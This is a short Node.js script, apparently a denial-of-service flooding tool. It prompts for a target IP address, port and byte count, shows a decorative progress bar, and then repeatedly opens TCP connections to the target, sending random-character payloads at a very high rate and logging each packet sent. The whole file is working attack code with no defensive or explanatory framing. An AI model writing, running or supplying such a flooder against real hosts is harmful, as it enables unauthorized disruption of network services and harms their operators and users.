var net = require('node:net');
const readline = require('node:readline');
let rl = readline.createInterface({
    input:process.stdin,
    output:process.stdout
});
f=(p)=>new Promise((resolve, reject)=>{rl.setPrompt(p);rl.prompt();rl.on("line",(i)=>resolve(i))})
var HOST = '';
var PORT = 0;
var bytes = 0 ;
f("IP(IPv4) :").then(i=>HOST=i).then(()=>f("Port     :")).then(i=>PORT=Number(i)).then(()=>f("Bytes    :")).then(i=>bytes=Number(i)).then(()=>{
  var client = new net.Socket();
  client.on('error', function (e) {
    console.log("ERROR: "+e.code);
    process.exit(1);
  });
  send=(data)=>{
    var t=new net.Socket();
    t.connect(PORT,HOST,()=>t.write(data,()=>t.destroy()))
  }
  _str="abcdefghigklmnopqrstuvwxyz0123456789";
  pli=(s,o)=>Math.round(Math.random()*(o-s)+s)
  get_b=(l)=>Array(l).fill().map(k=>_str[pli(0,35)]).join("")
  client.connect(PORT, HOST, function() {
    console.log('Connected to server: ' + HOST + ':' + PORT);
    print=(delay, message)=>new Promise(function (resolve, reject) {setTimeout(()=>{console.log(message);resolve()},delay)});
    print(10,"Ready:[        ]0%").then(()=>print(2000,"Ready:[==      ]25%")).then(()=>print(2000,"Ready:[====    ]50%")).then(()=>print(2000,"Ready:[======  ]75%")).then(()=>print(2000,"Ready:[========]100%")).then(()=>{
    sent = 0;
    setInterval(()=>new Promise(()=>{
      send(get_b(bytes));
      sent = sent + 1;
      console.log (`Sent ${sent} packet to ${HOST} throught port:${PORT}`);
    }),0.1)
    });
  })
})

